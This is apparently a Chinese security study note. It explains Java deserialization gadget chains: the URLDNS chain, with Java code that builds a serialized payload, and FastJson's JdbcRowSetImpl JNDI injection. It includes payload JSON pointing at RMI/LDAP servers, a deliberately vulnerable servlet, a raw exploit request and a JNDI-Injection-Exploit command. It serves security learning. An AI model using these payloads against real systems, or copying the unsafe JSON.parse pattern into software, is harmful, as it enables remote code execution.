---
title: JavaEE应用&原生和FastJson反序列化&URLDNS链&JDBC链&Gadget手搓
published: 2026-03-14 16:00:00
description: 重点分析两条经典利用链：原生反序列化的 URLDNS 链和 FastJson 的 JdbcRowSetImpl 链。通过手写 gadget 的方式，详细拆解了 HashMap + URL 如何触发 DNS 查询，以及 FastJson 解析特定 @type 如何导致 JNDI 注入。
tags: [Web开发,JavaEE]
category: 网络安全
draft: false
---

# 知识点

1. 安全开发-JavaEE-原生序列化-URLDNS链分析
2. 安全开发-JavaEE-FastJson-JdbcRowSetImpl链分析

利用链也叫"gadget chains"，我们通常称为gadget：

1. 共同条件：实现Serializable或者Externalizable接口，最好是jdk自带或者JAVA常用组件里有
2. 入口类source：（重写readObject 调用常见函数 参数类型宽泛 最好jdk自带）
3. 调用链gadget chain：相同方法名、相同类型
4. 执行类sink：RCE SSRF 写文件等等

**链可能来源于源码里面的东西，如果源码看不到或者源码不存在危险代码的类，该怎么办？**

**而依赖都是网上公开的，所以大部分情况都是从第三方依赖去找。**

# 原生反序列化及URLDNS链分析（JDK自带链）

核心：java.util.HashMap实现了Serializable接口满足条件后，通过HashMap里面的hash到key.hashCode()，key的转变URL类，再到hashCode为-1触发URLStreamHandler.hashCode

```
HashMap->readObject    

HashMap->putVal(put)        

HashMap->hash           

key.hashCode->

URL.hashCode->              

handler.hashCode->

URLStreamHandler.getHostAddress
```

写利用链：

参考：https://mp.weixin.qq.com/s/R3c5538ZML2yCF9pYUky6g

搞清楚入口类，需要修改的值，需要传递的值，

创建一个HashMap泛型，（后续操作URL类即int类型值）

在创建一个url连接，（将要请求的地址写入对应代码的U）

用put方法把url数据存放到里面，触发putVal(hash(key)

其中hash里面会调用key.hashCode()

最终触发点是key，所以我们就需要给key的类型设置成URL类，

通过逻辑让hashCode的值为-1后调用handler.hashCode即URLStreamHandler.hashCode，最终调用里面的getHostAddress实现

这里只展示关键部分：

 ![image-20260314114412176](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260314114412176.png)

![image-20260314115158639](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260314115158639.png)

![image-20260314141018349](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260314141018349.png)

## 序列化以及利用链

```java
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

public class UrlDns{

    public static void serializable(Object object) throws IOException {
        // 创建一个ObjectOutputStream对象，将数据写入dns.txt文件
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("dns.txt"));
        // 将传入的对象写入文件
        oos.writeObject(object);

    }

    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException {
        URL url = new URL("http://gutgjusuzq.zaza.eu.org");
        HashMap hashMap = new HashMap();

        // 利用反射，在put前将url对象的hashcode值改为-1
        Class cls = url.getClass();
        Field hashCode = cls.getDeclaredField("hashCode");
        hashCode.setAccessible(true);

        // 利用反射，在put之前将url对象的hashCode值设值成不为-1，put之后再利用反射，将其设置为-1
        // 这样put时就不会发起DNS请求了。然后将其序列化，再反序列化，反序列化时收到DNS请求。
        hashCode.set(url,1);

        // 在我们的DNS平台上收到的请求实际上是put时发出的，会对我们判断目标是否存在反序列化漏洞形成干扰。
        // put时不会触发DNS查询，因为hashCode不是-1
        hashMap.put(url,123);

        // put后再利用反射将hashcode设置为-1
        hashCode.set(url,-1);

        // 序列化hashmap
        serializable(hashMap);
    }
}
```

之后反序列化的时候就会触发DNS查询。

# FastJson反序列化及JdbcRowSetImp链分析（JDK自带链）

<img src="https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260314104314393.png" alt="image-20260314104314393" style="zoom:80%;" />

参考：https://mp.weixin.qq.com/s/t8sjv0Zg8_KMjuW4t-bE-w

FastJson是阿里巴巴的的开源库，用于对JSON格式的数据进行解析和打包。其实简单的来说就是处理json格式的数据的。例如将json转换成一个类。或者是将一个类转换成一段json数据。Fastjson 是一个 Java 库，提供了Java 对象与 JSON 相互转换。

```xml
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.24</version>
</dependency>
```

应用知识：

1. 序列化方法：

   JSON.toJSONString()，返回字符串；

   JSON.toJSONBytes()，返回byte数组；

2. 反序列化方法：

   JSON.parseObject()，返回JsonObject；

   JSON.parse()，返回Object；

   JSON.parseArray(), 返回JSONArray；

   将JSON对象转换为java对象：JSON.toJavaObject()；

   将JSON对象写入write流：JSON.writeJSONString()；

3. 常用：

   JSON.toJSONString(),JSON.parse(),JSON.parseObject()

```java
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

public class FastJsonTest {
    public static void main(String[] args) {
        // 将对象转换为JSON格式，序列化操作
        User myUser = new User("xiaoli",18,1);
        String json = JSON.toJSONString(myUser);
        System.out.println(json);
        System.out.println("-----------------");

        // 反序列化操作1
        User user = JSON.parseObject(json, User.class);
        System.out.println(user);
        System.out.println("-----------------");

        // 反序列化操作2
        JSONObject user1 = JSON.parseObject(json);
        System.out.println(user1);
        System.out.println("-----------------");

        // 反序列化操作3
        Object user2 = JSON.parse(json);
        System.out.println(user2);
    }
}
```

使用引出安全：

1. 序列化固定类后：

   parse方法在调用时会调用set方法

   parseObject在调用时会调用set和get方法

2. 反序列化指定类后：

   parseObject在调用时会调用set方法

   ```java
   import com.alibaba.fastjson.JSON;
   import com.alibaba.fastjson.JSONObject;
   import com.alibaba.fastjson.serializer.SerializerFeature;
   
   public class FastJsonTest {
       public static void main(String[] args) {
           // 将对象转换为JSON格式，序列化操作
           User myUser = new User("xiaoli",18,1);
   //        String json = JSON.toJSONString(myUser);
   
           // 序列化时使用WriteClassName，会在JSON中写入@type字段
           // 注意：序列化时会调用getter方法
           String json = JSON.toJSONString(myUser, SerializerFeature.WriteClassName);
           System.out.println(json);
           System.out.println("-----------------");
   
           /**
            * 关于FastJson反序列化的方法调用总结：
            *
            * 1. 当JSON中包含@type字段（即序列化时使用了WriteClassName）时：
            *    - parse方法：会调用无参构造和set方法
            *    - parseObject方法：会调用无参构造、set方法和get方法
            *
            * 2. 当反序列化指定目标类时（如parseObject(json, User.class)）：
            *    - parseObject方法：会调用无参构造和set方法
            */
   
           // 反序列化操作1：指定目标类型
           // 因为JSON中有@type，且指定了User.class
           // 实际执行：无参构造 + set方法
           User user = JSON.parseObject(json, User.class);
           System.out.println(user);
           System.out.println("-----------------");
   
           // 反序列化操作2：不指定类型，返回JSONObject
           // 因为JSON中有@type，流程是：
           // 先创建User对象（无参构造 + set方法）
           // 再从User对象转换为JSONObject（调用get方法）
           JSONObject user1 = JSON.parseObject(json);
           System.out.println(user1);
           System.out.println("-----------------");
   
           // 反序列化操作3：parse自动识别类型
           // 因为JSON中有@type，直接还原为User对象
           // 实际执行：无参构造 + set方法
           Object user2 = JSON.parse(json);
           System.out.println(user2);
       }
   }
   ```

安全利用链：

![image-20260314152344255](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260314152344255.png)



![image-20260314152352207](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260314152352207.png)

![](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260314152401308.png)

![image-20260314152421204](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260314152421204.png)

![image-20260314152427914](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260314152427914.png)

![image-20260314152436279](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260314152436279.png)

JDK自带链-JdbcRowSetImpl：

```java
System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
String payload = "{" +
                "\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"rmi://xx.xx.xx.xx/xxxx\", " +
                "\"autoCommit\":true" +
                "}";
JSON.parse(payload);
```

反序列化对象：com.sun.rowset.JdbcRowSetImpl

改动的成员变量：dataSourceName autoCommit

```
 setdataSourceName->getdataSourceName
 setautoCommit->connect->DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
```

最终形成：RMI注入：触发RCE

```
DataSource var2 = (DataSource)var1.lookup("rmi://192.168.1.2:1099/jvelrl");
```

![image-20260316092511008](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260316092511008.png)

创建项目FastJsonServletDemo，引入依赖项fastjson。

```java
package com.example.fastjsonservletdemo;

import com.alibaba.fastjson.JSON;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@WebServlet(name = "index",value = "/index")
public class FastJsonServlet extends HttpServlet {
    @Override
    public void init() throws ServletException {
        System.out.println("FastJsonServlet init");
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String json = req.getParameter("json");
        JSON.parse(json);
    }
}
```

之后发送post请求：

这里有坑，在使用小黄鸟的json数据类型提交时候，因为请求头不匹配，而且发送json数据类型的请求头是固定的无法修改和删除，所以这里要自行设置raw的请求头和数据。

```
Content-Type application/x-www-form-urlencoded

json={"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ip/02bzi2","autoCommit":true}
```

![image-20260314155531515](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260314155531515.png)

![image-20260314160527120](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260314160527120.png)

但是最终没弹出计算器，不知道什么情况。

# 远程调用

var1.lookup RMI协议远程调用（引出下节课将讲到）

```
autoCommit->setAutoCommit->
this.connect()->var1.lookup(this.getDataSourceName());
```

生成RMI恶意调用类：java -jar

```
JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc"
```

